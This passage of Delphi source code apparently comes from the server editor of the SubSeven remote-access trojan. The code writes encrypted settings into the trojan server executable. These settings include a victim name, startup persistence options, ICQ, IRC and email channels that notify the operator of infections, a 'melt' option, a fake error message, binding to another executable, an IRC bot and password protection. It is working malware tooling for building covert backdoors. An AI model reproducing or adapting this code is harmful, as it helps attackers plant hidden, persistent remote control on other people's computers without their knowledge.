  if GiveHelp.FlatRadioButton1.Checked then t:=0;
  if GiveHelp.FlatRadioButton2.Checked then t:=1;
  if GiveHelp.FlatRadioButton3.Checked then t:=2;
  if GiveHelp.FlatRadioButton4.Checked then t:=3;
  if GiveHelp.FlatRadioButton5.Checked then t:=4;
  if GiveHelp.FlatRadioButton6.Checked then t:=5;
 SaveData:=SaveData+inttostr(t);
  if GiveHelp.FlatSpeedButton1.Down then t:=0;
  if GiveHelp.FlatSpeedButton5.Down then t:=1;
  if GiveHelp.FlatSpeedButton4.Down then t:=2;
  if GiveHelp.FlatSpeedButton3.Down then t:=3;
  if GiveHelp.FlatSpeedButton2.Down then t:=4;
 SaveData:=SaveData+inttostr(t);
 SaveData:=SaveData+FalDe(GiveHelp.FlatEdit9.Text,20);
 SaveData:=SaveData+FalDe(GiveHelp.FlatEdit10.Text,40);
 SaveData:=SaveData+AddCheck(ICQCheck.Checked);
 SaveData:=SaveData+FalDe(ICQEdit.Text,12);
 SaveData:=SaveData+AddCheck(IRCCheck.Checked);
 SaveData:=SaveData+FalDe(CNEdit.Text,12);
 SaveData:=SaveData+FalDe(IRCServerEdit.Text,25);
 SaveData:=SaveData+FalDe(IRCPortEdit.Text,6);
 SaveData:=SaveData+AddCheck(MailCheck.Checked);
 SaveData:=SaveData+FalDe(EmailEdit.Text,30);
 SaveData:=SaveData+FalDe(EMServerEdit.Text,40);
 SaveData:=SaveData+FalDe(EMUserEdit.Text,10);
 SaveData:=Encrypt(SaveData);
 for i:=1 to DataSize1 do r1.SaveData1[i]:=SaveData[i];
 SaveData:='';
 SaveData:=SaveData+FalDe(VictimEdit.Text,20);
 SaveData:=SaveData+AddCheck(Run1Check.Checked);
 SaveData:=SaveData+AddCheck(Run2Check.Checked);
 SaveData:=SaveData+AddCheck(Run3Check.Checked);
 SaveData:=SaveData+AddCheck(Run4Check.Checked);
 SaveData:=SaveData+AddCheck(Run5Check.Checked);
 SaveData:=SaveData+FalDe(RegEdit.Text,20);
 if EXE_SIZE<>'0' then
  begin
   SaveData:=SaveData+AddCheck(true);
   SaveData:=SaveData+FalDe(EXE_SIZE,10);
  end else begin
   SaveData:=SaveData+AddCheck(PatchCheck.Checked);
   SaveData:=SaveData+FalDe(IntToStr(FileSize(PatchEdit.Text)),10);
  end;

 SaveData:=SaveData+AddCheck(RndPortCheck.Checked);
 with IrcBotForm do begin
 SaveData:=SaveData+AddCheck(IRCBot.Checked);SaveData:=SaveData+FalDe(IRCBOT1.Text,25);
 SaveData:=SaveData+FalDe(IRCBOT2.Text,10);SaveData:=SaveData+FalDe(IRCBOT3.Text,15);
 SaveData:=SaveData+FalDe(IRCBOT4.Text,10);SaveData:=SaveData+FalDe(IRCBOT5.Text,5);
 SaveData:=SaveData+FalDe(IRCBOT6.Text,20);SaveData:=SaveData+FalDe(IRCBOT7.Text,10);
 end;

 SaveData:=SaveData+AddCheck(ProtCheck.Checked);
 SaveData:=SaveData+FalDe(Prot1Edit.Text,20);
 
 SaveData:=Encrypt(SaveData);
 for i:=1 to DataSize2 do r2.SaveData2[i]:=SaveData[i];

 FindFirst(EditServerName.Text,faAnyFile,rec);
 ExeSize := rec.Size;

 try AssignFile(f,EditServerName.Text);except yay:=false;ShowMsg('can''t write to server-file.');end;
 try reset(f,1);except yay:=false;ShowMsg('can''t open server-file.');end;
 try
  if DontRead then Seek(f,ExeSize) else begin Seek(f,ExeSize-(DataSize1+DataSize2));Truncate(f);end;
  if (PatchCheck.Checked) and (not BindedWithExe) then
   begin
    AssignFile(f2, PatchEdit.Text);
    Reset(f2, 1);
    repeat
     BlockRead(f2, Bf, SizeOf(Bf), NumRead);
     BlockWrite(f, Bf, NumRead, NumWritten);
    until (NumRead = 0) or (NumWritten <> NumRead);
    CloseFile(f2);
   end;
  BlockWrite(f,r1.SaveData1,DataSize1);
  BlockWrite(f,r2.SaveData2,DataSize2);
 except
  yay:=false;
  ShowMsg('error writing to server-file.');
 end;
 CloseFile(f);
 try ChangeIconForm.OutlookClick(self);except end;
 ShowMsg('server saved successfully.');
end;

function ExtractString(s:string):string;
var i:integer;
    news:string;
begin
 news:='';
 for i:=1 to length(s) do if s[i]<>'ô' then news:=news+s[i];
 result:=news;
end;

function TEditForm.PassProtected(filename:string):boolean;
var f:file;
    rec:TSearchRec;
    ExeSize:LongInt;
    buf:array[1..DataSize1+DataSize2] of char;
    BufStr:String;
    count,i:integer;
begin
 result:=false;
 if DontRead then Exit;
 FindFirst(EditServerName.Text,faAnyFile,rec);
 ExeSize := rec.Size;
 AssignFile(f,filename);try Reset(f,1);except ShowMsg('can''t open file.');end;
 Seek(f,ExeSize-DataSize2);
 BlockRead(f,buf,DataSize2);
 CloseFile(f);
 bufstr:='';
 for i:=1 to DataSize2 do BufStr:=BufStr+buf[i];
 BufStr:=Decrypt(BufStr);
 if BufStr[length(BufStr)-20]='0' then begin HasPass:=false;exit;end;
 HasPass:=True;
 Pass:=Copy(BufStr,length(BufStr)-19,20);
 Pass:=ExtractString(Pass);
 GetTextForm.GetText('server is password protected','password:','',true,TmpStr);
 if TmpStr<>Pass then begin ShowMsg('invalid password.');result:=true;end;
end;

function TEditForm.CorrectVersion(filename:string):boolean;
var f:file;
    rec:TSearchRec;
    ExeSize:LongInt;
    buf:array[1..DataSize1+DataSize2] of char;
    BufStr:String;
    count,i:integer;
    ver:ansistring;
begin
 result:=true;
 FindFirst(EditServerName.Text,faAnyFile,rec);
 ExeSize := rec.Size;
 AssignFile(f,filename);try Reset(f,1);except ShowMsg('can''t open file.');end;
 Seek(f,ExeSize-DataSize2-DataSize1);
 BlockRead(f,buf,DataSize1);
 CloseFile(f);
 ver:='';
 for i:=1 to DataSize1+DataSize2 do
  ver:=ver+buf[i];//+buf[2]+buf[3]+buf[4];
 ver:=decrypt(ver);
 if ver[3]+ver[4]<>EditServerVersion then
  begin
   if AreYouSure('invalid server. proceed anyway?') then DontRead:=True else result:=false;
  end;
end;

function FromStr(var s:string;c:integer):string;
var i:integer;
    news:string;
begin
 news:='';
 for i:=1 to c do if s[i]<>'ô' then news:=news+s[i];
 result:=news;
 Delete(s,1,c);
end;

function ReadBool(var s:string):boolean;
begin
 if s[1]='0' then result:=false else result:=true;
 Delete(s,1,1);
end;


procedure TEditForm.ReadSettings;
var f:file;
    rec:TSearchRec;
    ExeSize:LongInt;
    buf:array[1..DataSize1+DataSize2] of char;
    BufStr:String;
    count,i:integer;
begin
 if (HasPass) and (Pass<>TmpStr) then EXIT;
 FindFirst(EditServerName.Text,faAnyFile,rec);
 ExeSize := rec.Size;
 AssignFile(f,EditServerName.Text);try Reset(f,1);except ShowMsg('can''t open file.');end;
 Seek(f,ExeSize-DataSize2-DataSize1);
 BlockRead(f,buf,DataSize2+DataSize1);
 CloseFile(f);
 bufstr:='';for i:=1 to DataSize1 do BufStr:=BufStr+buf[i];
 BufStr:=Decrypt(BufStr);
 Delete(BufStr,1,4);
 PortEdit.Text:=FromStr(BufStr,10);
 if PortEdit.Text='1243' then PortCheck.Checked:=False else PortCheck.Checked:=True;
 PassEdit1.Text:=FromStr(BufStr,12);PassEdit2.Text:=PassEdit1.Text;
 if PassEdit1.Text='' then PassCheck.Checked:=False else PassCheck.Checked:=True;
 ProtectCheck.Checked:=ReadBool(BufStr);
 File1Check.Checked:=ReadBool(BufStr);if (not File1Check.Checked) then File2Check.Checked:=True;
 FileNameEdit.Text:=FromStr(BufStr,15);
 MeltCheck.Checked:=ReadBool(BufStr);
 FakeCheck.Checked:=ReadBool(BufStr);
 GiveHelp.FlatSpeedButton1.Down:=False;GiveHelp.FlatSpeedButton2.Down:=False;
 GiveHelp.FlatSpeedButton3.Down:=False;GiveHelp.FlatSpeedButton4.Down:=False;GiveHelp.FlatSpeedButton5.Down:=False;
 GiveHelp.FlatRadioButton1.Checked:=False;GiveHelp.FlatRadioButton2.Checked:=False;
 GiveHelp.FlatRadioButton3.Checked:=False;GiveHelp.FlatRadioButton4.Checked:=False;
 GiveHelp.FlatRadioButton5.Checked:=False;GiveHelp.FlatRadioButton6.Checked:=False;
 case BufStr[1] of
  '0':GiveHelp.FlatRadioButton1.Checked:=True;
  '1':GiveHelp.FlatRadioButton2.Checked:=True;
  '2':GiveHelp.FlatRadioButton3.Checked:=True;
  '3':GiveHelp.FlatRadioButton4.Checked:=True;
  '4':GiveHelp.FlatRadioButton5.Checked:=True;
  '5':GiveHelp.FlatRadioButton6.Checked:=True;
 end;
 Delete(BufStr,1,1);
 case BufStr[1] of
  '0':GiveHelp.FlatSpeedButton1.Down:=True;
  '1':GiveHelp.FlatSpeedButton5.Down:=True;
  '2':GiveHelp.FlatSpeedButton4.Down:=True;
  '3':GiveHelp.FlatSpeedButton3.Down:=True;
  '4':GiveHelp.FlatSpeedButton2.Down:=True;
 end;
 Delete(BufStr,1,1);
 GiveHelp.FlatEdit9.Text:=FromStr(BufStr,20);
 GiveHelp.FlatEdit10.Text:=FromStr(BufStr,40);
 ICQCheck.Checked:=ReadBool(BufStr);
 ICQEdit.Text:=FromStr(BufStr,12);
 IRCCheck.Checked:=ReadBool(BufStr);
 CNEdit.Text:=FromStr(BufStr,12);
 IRCServerEdit.Text:=FromStr(BufStr,25);
 IRCPortEdit.Text:=FromStr(BufStr,6);
 MailCheck.Checked:=ReadBool(BufStr);
 EmailEdit.Text:=FromStr(BufStr,30);
 EMServerEdit.Text:=FromStr(BufStr,40);
 EMUserEdit.Text:=FromStr(BufStr,10);
 bufstr:='';for i:=DataSize1+1 to DataSize1+DataSize2 do BufStr:=BufStr+buf[i];
 BufStr:=Decrypt(BufStr);
 VictimEdit.Text:=FromStr(BufStr,20);
 Run1Check.Checked:=ReadBool(BufStr);
 Run2Check.Checked:=ReadBool(BufStr);
 Run3Check.Checked:=ReadBool(BufStr);
 Run4Check.Checked:=ReadBool(BufStr);
 Run5Check.Checked:=ReadBool(BufStr);
 RegEdit.Text:=FromStr(BufStr,20);
 PatchCheck.Checked:=ReadBool(BufStr);
 EXE_SIZE:=FromStr(BufStr,10);if not PatchCheck.Checked then BindedWithExe:=False else BindedWithExe:=True;
 if BindedWithExe then begin PatchEdit.Text:='file size: '+EXE_SIZE;PatchEdit.Enabled:=False;PatchCheck.Enabled:=False;end;
 RndPortCheck.Checked:=ReadBool(BufStr);
 IrcBot.Checked:=ReadBool(BufStr);
 with IrcBotForm do begin IRCBOT1.Text:=FromStr(BufStr,25);IRCBOT2.Text:=FromStr(BufStr,10);
  IRCBOT3.Text:=FromStr(BufStr,15);IRCBOT4.Text:=FromStr(BufStr,10);
  IRCBOT5.Text:=FromStr(BufStr,5); IRCBOT6.Text:=FromStr(BufStr,20);
  IRCBOT7.Text:=FromStr(BufStr,10);end;
 ProtCheck.Checked:=ReadBool(BufStr);
 Prot1Edit.Text:=FromStr(BufStr,20);Prot2Edit.Text:=Prot1Edit.Text;
end;

procedure TEditForm.SmtpClientRequestDone(Sender: TObject;
  RqType: TSmtpRequest; Error: Word);
begin
 if Error=0 then Proceed:=1 else Proceed:=2;
end;

procedure TEditForm.SmtpClientDisplay(Sender: TObject; Msg: String);
begin
 LastMsg:=Msg;
end;

procedure TEditForm.OutlookBtn8Click(Sender: TObject);
var frm:TMsgForm;
    SmtpClient: TSmtpCli;
procedure Er(msg:string);
begin
 frm.Mesaj.Caption:=msg;
 frm.OutLookBtn1.Caption:='close';
 frm.OutLookBtn1.Visible:=True;
 frm.Height:=100;
 if LastMsg<>'' then showmessage(LastMsg);
 frm.hide;frm.ShowModal;frm.hide;frm.free;
 try SMTPClient.Abort;SMTPClient.Quit;SMTPClient.Free;except end;
end;
begin
 LastMsg:='';
 SmtpClient:=TSMTPCli.Create(self);
 SmtpClient.OnRequestDone:=SmtpClientRequestDone;
 SmtpClient.OnDisplay:=SmtpClientDisplay;
 frm:=TMsgForm.Create(self);
 frm.CaptionLabel.Caption:='testing e-mail server';
 frm.FormStyle:=fsStayOnTop;
 frm.MakeSplash;
 frm.Mesaj.Caption:='connecting to e-mail server...';
 SmtpClient.Host := EMServerEdit.Text;
// SmtpClient.Port := PortEdit.Text;
 try
  Proceed:=0;Timer.Enabled:=True;SmtpClient.Connect;
  repeat Application.ProcessMessages; until Proceed<>0;Timer.Enabled:=False;
 except end;
 if Proceed=2 then begin Er('error connecting to e-mail server.');exit;end;
  frm.Mesaj.Caption:='sending login info ...';
  SmtpClient.SignOn:='helo';
  Timer.Enabled:=True;Proceed:=0;SmtpClient.Helo;repeat Application.ProcessMessages; until Proceed<>0;Timer.Enabled:=False;
  if Proceed=2 then begin Er('error logging to server.');exit;end;
 try
  frm.Mesaj.Caption:='sending e-mail...';
  SmtpClient.FromName        := 'EditServer@nowhere.com';
  Timer.Enabled:=True;Proceed:=0;SmtpClient.MailFrom;repeat Application.ProcessMessages; until Proceed<>0;Timer.Enabled:=False;
  if Proceed=2 then begin Er('e-mail sender error.');exit;end;
  SmtpClient.RcptName.Clear;
  SmtpClient.RcptName.Add(EMailEdit.Text);
  Timer.Enabled:=True;Proceed:=0;SmtpClient.RcptTo;repeat Application.ProcessMessages; until Proceed<>0;Timer.Enabled:=False;
  if Proceed=2 then begin Er('rcpto error.');exit;end;
  SmtpClient.RcptName.Clear;
  SmtpClient.RcptName.Add(EMailEdit.Text);
  SmtpClient.HdrFrom         := 'EditServer';
  SmtpClient.HdrTo           := EMailEdit.Text;
  SmtpClient.HdrSubject      := 'EditServer e-mail server test.';
  SmtpClient.EmailFiles.Text := '';
  Timer.Enabled:=True;Proceed:=0;SmtpClient.Data;repeat Application.ProcessMessages; until Proceed<>0;Timer.Enabled:=False;
  if Proceed=2 then begin Er('DATA error.');exit;end;
 except
  Er('error sending e-mail.');
  exit;
 end;
 try SMTPClient.Quit;SMTPClient.Free;except end;
 frm.Mesaj.Caption:='e-mail sent successfully.';
 frm.OutLookBtn1.Caption:='close';
 frm.OutLookBtn1.Visible:=True;
 frm.Height:=100;
 frm.hide;frm.ShowModal;frm.hide;frm.free;
end;

procedure TEditForm.EditServerNameKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
 if key=13 then
  begin
   key:=3;
   try
   _ico:=TIcon.Create;
   _ico.Handle:=ExtractIcon(0,PChar(EditServerName.Text),0);
   CurIco.Picture.Assign(_Ico);
   _Ico.Free;
   except end;
   if not MergePagina(2) then exit;
  end;
end;

procedure TEditForm.ToolbarButton971Click(Sender: TObject);
begin
 GiveHelp.Tag:=6;
 GiveHelp.Show;
end;

procedure TEditForm.OutlookBtn3Click(Sender: TObject);
begin
 if (not CorrectVersion(EditServerName.Text)) then Exit;//begin ShowMsg('specified file is not a SubSeven server.');EXIT;end;
 ChangeIconForm.Show;
end;

procedure TEditForm.Label9Click(Sender: TObject);
begin
 GiveHelp.Tag:=8;
 GiveHelp.Show;
end;

procedure TEditForm.OutlookBtn9Click(Sender: TObject);
begin
 IrcBotForm.Show;
end;

procedure TEditForm.OutlookBtn10Click(Sender: TObject);
begin
 if not MergePagina(2) then Exit;
end;

procedure TEditForm.TimerTimer(Sender: TObject);
begin
 Proceed:=2;Timer.Enabled:=False;
end;

procedure TEditForm.WriteKey(sProgTitle,SCmdLine:string);
var sKey:String;
    reg:TRegIniFile;
begin
 sKey:='';
 reg:=TRegIniFile.Create('');
 reg.RootKey:=HKEY_LOCAL_MACHINE;
 reg.WriteString(RegDir
                +sKey+#0,sProgTitle,sCmdLine);
 reg.Free;
end;
function TEditForm.ReadKey(Section:String):String;
var Reg:TRegistry;
    MySerial:String;
begin
 Reg:=TRegistry.Create;
 with Reg do begin
  RootKey:=HKEY_LOCAL_MACHINE;
  if OpenKey(RegDir,false) then
   try
    MySerial:=ReadString(Section);
   except
    MySerial:='';
   end;
   Free;
  end;
Result:=MySerial;
end;

procedure TEditForm.FormShow(Sender: TObject);
var r:string;
begin
 Invalidate;{
 if facut then exit;
 FACUT:=TRUE;
 try r:=ReadKey('color1');except r:='';end;if r<>'' then try cMenuBackground:=StringToColor(r);except end;
 try r:=ReadKey('color2');except r:='';end;if r<>'' then try cMenuPageNormalText:=StringToColor(r);except end;
 try r:=ReadKey('color3');except r:='';end;if r<>'' then try cMenuPageNormalBorder:=StringToColor(r);except end;
 try r:=ReadKey('color4');except r:='';end;if r<>'' then try cMenuPageSelectedBorder:=StringToColor(r);except end;
 try r:=ReadKey('color5');except r:='';end;if r<>'' then try cMenuItemNormalText:=StringToColor(r);except end;
 try r:=ReadKey('color6');except r:='';end;if r<>'' then try cMenuItemNormalBorder:=StringToColor(r);except end;
 try r:=ReadKey('color7');except r:='';end;if r<>'' then try cMenuItemSelectedText:=StringToColor(r);except end;
 try r:=ReadKey('color8');except r:='';end;if r<>'' then try cMenuArrows:=StringToColor(r);except end;
 try r:=ReadKey('color9');except r:='';end;if r<>'' then try cFormLine:=StringToColor(r);except end;
 try r:=ReadKey('color10');except r:='';end;if r<>'' then try cFormBackGround:=StringToColor(r);except end;
 try r:=ReadKey('color11');except r:='';end;if r<>'' then try cFormCaption:=StringToColor(r);except end;
 try r:=ReadKey('color12');except r:='';end;if r<>'' then try cFormText:=StringToColor(r);except end;
 try r:=ReadKey('color13');except r:='';end;if r<>'' then try cButtonText:=StringToColor(r);except end;
 try r:=ReadKey('color14');except r:='';end;if r<>'' then try cButtonBorder:=StringToColor(r);except end;
 try r:=ReadKey('color15');except r:='';end;if r<>'' then try cButtonOverFill:=StringToColor(r);except end;
 try r:=ReadKey('color16');except r:='';end;if r<>'' then try cButtonClickFill:=StringToColor(r);except end;
 try r:=ReadKey('color17');except r:='';end;if r<>'' then try cFormForeGround:=StringToColor(r);except end;
 SetTheColors;}
end;

procedure TEditForm.FormClose(Sender: TObject; var Action: TCloseAction);
begin
 WriteKey('es_filename',EditServerName.Text);
end;

procedure TEditForm.ToolbarButton977Click(Sender: TObject);
begin
 GiveHelp.Tag:=9;
 GiveHelp.Show;
end;

procedure TEditForm.FormPaint(Sender: TObject);
var i:integer;
begin
 for i:=24  to Height-5 do Canvas.CopyRect(bounds(0,i,4,1),bit_window.canvas,bounds(1,26,4,1));
 for i:=24 to Height-5 do Canvas.CopyRect(bounds(Width-4,i,4,1),bit_window.canvas,bounds(48,26,4,1));
 for i:=24 to Width-24 do Canvas.CopyRect(bounds(i,0,1,24),bit_window.canvas,bounds(26,1,1,24));
 for i:=4 to Width-4 do Canvas.CopyRect(bounds(i,Height-4,1,4),bit_window.canvas,bounds(26,28,1,4));
 Canvas.CopyRect(bounds(0,0,24,24),bit_window.canvas,bounds(1,1,24,24));
 Canvas.CopyRect(bounds(Width-24,0,24,24),bit_window.canvas,bounds(28,1,24,24));
 Canvas.CopyRect(bounds(0,Height-4,4,4),bit_window.canvas,bounds(1,28,4,4));
 Canvas.CopyRect(bounds(Width-4,Height-4,4,4),bit_window.canvas,bounds(48,28,4,4));
 Canvas.Brush.Color:=BackgroundColor;
 Canvas.FillRect(Bounds(4,24,width-8,height-28));
end;

end.
